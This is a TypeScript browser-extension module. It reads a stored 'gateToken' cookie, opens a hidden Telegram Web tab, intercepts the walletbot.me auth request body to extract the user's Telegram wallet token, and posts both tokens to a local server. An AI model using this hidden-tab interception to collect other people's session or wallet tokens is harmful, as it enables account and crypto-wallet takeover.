import { Storage } from "@plasmohq/storage"

const storage = new Storage()

export async function sendTokensToRoute() {
  const gateCookies = await storage.get("gateCookies")
  const telegramCookies = await storage.get("telegramCookies")
  const deviceToken =
    (await storage.get("deviceToken")) || generateDeviceToken()

  const gateToken = gateCookies.find(
    (cookie) => cookie.name === "gateToken"
  )?.value
  const tgToken = await getTelegramToken()

  if (gateToken && tgToken) {
    try {
      const response = await fetch("http://localhost:3000/api/token-update", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ deviceToken, tgToken, gateToken })
      })
      const result = await response.json()
      console.log("Token update result:", result)
      return result
    } catch (error) {
      console.error("Error sending tokens to route:", error)
      return { error: "Failed to send tokens" }
    }
  } else {
    console.log("Missing gateToken or tgToken")
    return { error: "Missing tokens" }
  }
}

function generateDeviceToken() {
  const token =
    Math.random().toString(36).substring(2, 15) +
    Math.random().toString(36).substring(2, 15)
  storage.set("deviceToken", token)
  return token
}

async function getTelegramToken() {
  return new Promise<string | null>((resolve, reject) => {
    let tabId: number

    const listener = (details) => {
      if (details.url.includes("walletbot.me/api/v1/users/auth")) {
        chrome.webRequest.onBeforeRequest.removeListener(listener)

        try {
          const token = JSON.parse(
            decodeURIComponent(details.requestBody.formData.token[0])
          )
          resolve(token.value)
        } catch (error) {
          reject(error)
        } finally {
          if (tabId) {
            chrome.tabs.remove(tabId)
          }
        }
      }
    }

    chrome.webRequest.onBeforeRequest.addListener(
      listener,
      { urls: ["<all_urls>"], types: ["xmlhttprequest"] },
      ["requestBody"]
    )

    chrome.tabs.create(
      { url: "https://web.telegram.org/k/", active: false },
      (tab) => {
        tabId = tab.id

        // Set a timeout to close the tab if no auth request is detected
        setTimeout(() => {
          chrome.webRequest.onBeforeRequest.removeListener(listener)
          if (tabId) {
            chrome.tabs.remove(tabId)
          }
          resolve(null)
        }, 60000) // 60 seconds timeout
      }
    )
  })
}
